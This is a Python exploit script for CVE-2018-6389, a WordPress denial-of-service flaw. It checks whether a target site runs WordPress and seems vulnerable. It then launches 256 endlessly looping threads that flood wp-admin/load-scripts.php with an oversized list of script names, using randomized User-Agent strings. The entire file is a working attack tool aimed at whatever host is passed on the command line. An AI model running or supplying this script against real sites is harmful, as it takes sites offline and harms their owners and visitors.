import argparse
from log_colors import *
import requests
import sys
import threading
import random
import lxml.html
requests.packages.urllib3.disable_warnings()

class DoSAttackRequest(threading.Thread):
    def __init__(self, tid, host, url):
        threading.Thread.__init__(self)
        self.host, self.url = host, url
        self.tid = tid
        self.gen_attack_header()
    
    def gen_attack_header(self):
        ua = RandomUserAgent()
        headers = {
            "Host" : host,
            'User-Agent' : ua.new(),
            "Accept" : 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Charset' : 'utf-8;q=0.7,*;q=0.7',
            'Cache-Control' : 'no-cache',
            'Connection' : 'keep-alive',
        }
        self.headers = headers

    def run(self):
        while True:
            print (LogColors.BLUE + "send: " + str(self.tid) + "..." + LogColors.ENDC)
            try:
                r = requests.get(self.url, headers = self.headers, verify = False)
                print (LogColors.YELLOW + str(self.tid) + " status code: " + str(r.status_code) + LogColors.ENDC)
            except Exception as e:
                print (LogColors.RED + str(self.tid) + " error: " + str(e) + LogColors.ENDC)

# random user agent
class RandomUserAgent:
    agent = {}

    def new(self):
        self.get_platform()
        self.get_os()
        self.get_browser()
        
        if self.agent['browser'] == 'Chrome':
            webkit = str(random.randint(500, 599))
            version = "%s.0%s.%s"%(str(random.randint(0, 24)), str(random.randint(0, 1500)), str(random.randint(0, 999)))
            
            return "Mozilla/5.0 (%s) AppleWebKit/%s.0 (KHTML, like Gecko) Chrome/%s Safari/%s"%(self.agent['os'], webkit, version, webkit)
        
        elif self.agent['browser'] == 'Firefox':
            year = str(random.randint(2000, 2015))
            month = str(random.randint(1, 12)).zfill(2)
            day = str(random.randint(1, 28)).zfill(2)
            gecko = "%s%s%s"%(year, month, day)
            version = "%s.0"%(str(random.randint(1, 15)))
            return "Mozillia/5.0 (%s; rv:%s) Gecko/%s Firefox/%s"%(self.agent['os'], version, gecko, version)
        
        elif self.agent['browser'] == 'IE':
            version = "%s.0"%(str(random.randint(1, 10)))
            engine = "%s.0"%(str(random.randint(1, 5)))
            option = random.choice([True, False])
            if option:
                token = "%s;"%(random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']))
            else:
                token = ''
            return "Mozilla/5.0 (compatible; MSIE %s; %s; %sTrident/%s)"%(version, self.agent['os'], token, engine)

    def get_os(self):
        if self.agent['platform'] == 'Machintosh':
            self.agent['os'] = random.choice(['68K', 'PPC'])
        elif self.agent['platform'] == 'Windows':
            self.agent['os'] = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE'])
        elif self.agent['platform'] == 'X11':
            self.agent['os'] = random.choice(['Linux i686', 'Linux x86_64'])

    def get_browser(self):
        self.agent['browser'] = random.choice(['Chrome', 'Firefox', 'IE'])

    def get_platform(self):
        self.agent['platform'] = random.choice(['Machintosh', 'Windows', 'X11'])

# CVE-2018-6389
# DoS wordpress site by
# large requests by
# wp-admin load_scripts.php
class CVE2018_6389:
    headers = {"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:61.0) Gecko/20100101 Firefox/61.0"}

    # params:
    # host - target vulnerable wordpress url
    def __init__(self, host):
        self.host = host
        bad = """eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter"
        """
        self.session = requests.Session()
        self.url = "https://" + self.host
        self.attack_url = "https://" + self.host + "/wp-admin/load-scripts.php?c=1&load%5B%5D=" + bad
    
    # check if url is wordpress site or not
    def is_wordpress(self):
        r = self.session.get(self.url, headers = self.headers, verify = False)
        if r.ok:
            tree = lxml.html.fromstring(r.text)
            wp = tree.xpath(".//meta[contains(@content, 'WordPress')]")
            if wp:
                wp = wp[0].get("content")
                print (LogColors.BLUE + self.url + " wordpress (" + wp + ") detected..." + LogColors.ENDC)
                return True
        return False

    # check if site is vulnerable?
    def is_vuln(self):
        vuln_url = "https://" + self.host + "/wp-admin/load-scripts.php?c=1&load[]=jquery-ui-core&ver=4.9.1"
        r = self.session.get(vuln_url, headers = self.headers, verify = False)
        if r.ok:
            print (LogColors.GREEN + self.url + " may be vulnerable :)" + LogColors.ENDC)
            return True
        else:
            print (LogColors.RED + self.url + " seems like not vulnerable :(" + LogColors.ENDC)
        return False

    # run DoS attack
    def dos_attack(self):
        print (LogColors.BLUE + "DoS attack checking..." + LogColors.ENDC)
        threadLock = threading.Lock()
        threads = [DoSAttackRequest(j, self.host, self.attack_url) for j in range(0, 256)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        print (LogColors.GREEN + "DoS successfully checked :)" + LogColors.ENDC)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "target wordpress site")
    args = vars(parser.parse_args())
    host = args['target']
    cve = CVE2018_6389(host)
    if cve.is_wordpress() and cve.is_vuln():
        cve.dos_attack()
